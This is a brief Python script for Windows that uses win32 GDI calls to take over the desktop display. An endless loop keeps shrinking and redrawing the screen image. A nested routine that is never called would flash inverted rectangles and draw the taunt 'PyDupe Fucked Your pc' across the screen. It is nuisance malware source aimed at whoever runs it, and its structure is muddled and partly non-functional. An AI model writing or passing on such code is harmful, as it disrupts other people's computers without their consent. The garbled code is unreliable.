import time
import random
from win32api import *
from win32con import *
from win32gui import *
from ctypes import windll


sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
HDC = GetDC(0)
w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
ReleaseDC(0, hdc)


while True:
        StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
        time.sleep(0.01)
        def screen_glitch(repeat_time, r, g, b):
            desk = GetDC(0)
            x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
            for i in range(repeat_time):
                brush = CreateSolidBrush(RGB(
            r,
            g,
            b
            ))
            SelectObject(desk, brush)
            PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
            DeleteObject(brush)
            time.sleep(0.008)
            ReleaseDC(desk, GetDesktopWindow())
            DeleteDC(desk)
            x, y = 0, 0
            signX, signY = 1, 1
            incrementor = 9
            w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
            text = "PyDupe Fucked Your pc"
            color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
            SetTextColor(hdc, color)
            SetBkMode(hdc, 0)
            ExtTextOut(hdc, x, y, 0, None, text, None)
            x += incrementor * signX
            y += incrementor * signY
            if y >= h or y <= 0:
                signY *= -1
            if x >= w or x <= 0:
                signX *= -1
            time.sleep(0.01)
            ReleaseDC(0, hdc)